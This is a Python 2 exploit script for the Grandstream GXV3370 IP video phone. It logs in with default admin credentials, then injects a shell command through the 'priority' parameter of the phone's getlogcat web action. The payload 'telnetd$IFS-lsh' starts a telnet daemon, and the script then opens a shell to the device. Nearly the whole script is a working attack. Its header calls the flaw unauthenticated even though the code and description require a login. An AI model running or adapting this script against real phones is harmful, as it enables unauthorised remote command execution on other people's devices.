#!/usr/bin/env python2
"""
Grandstream - GXV3370 (IP Video Phone) Unauthenticated RCE
Author: Brendan Scarvell
Vulnerable versions: < 1.0.1.41

A post authentication command injection vulnerability exists in the `priority` parameter.
"""
import sys, requests, os, json, hashlib, time

requests.packages.urllib3.disable_warnings()

s = requests.Session()

if len(sys.argv) == 1:
    print "Usage: {} <host> <port>".format(sys.argv[0])
    sys.exit()

HOST = sys.argv[1]
PORT = 80 if len(sys.argv) < 3 else sys.argv[2]

# Edit me
USERNAME = "admin" # default: admin
PASSWORD = "admin" # default: admin

payload="telnetd$IFS-lsh"

auth_token = ""
cookie = "session-identify={}"

def getChallenge():
    # action=challenge&user=admin
    r = s.get("http://{}:{}/manager?action=loginrealm".format(HOST,PORT))
    return r.text

def login(challenge):
    # password gets sent as sha256(username + ':' + challenge + ':' + password)
    secret = hashlib.new('sha256')
    secret.update("{}:{}:{}".format(USERNAME,challenge,PASSWORD))
    r = s.post("http://{}:{}/manager?action=login&Username={}&Secret={}&t=sha&src=web".format(HOST,PORT,USERNAME, secret.hexdigest()))
    return r.text

def runCmd(cmd):
    r = s.post("http://{}:{}/manager?action=getlogcat&region=maintenance&tag=1&priority=D;{}".format(HOST,PORT,cmd))
    return r.text

# Login to the phone
challenge = getChallenge()
resp = login(challenge)

# Ensure auth was successful
if 'Response=Success' not in resp:
    print "[*] Authentication failed. Exploit failed."
    sys.exit()


print "[*] Running payload.."
resp = runCmd(payload)
print "[*] Waiting.."
time.sleep(2)
os.system("telnet {}".format(HOST))
print "[*] Finished."
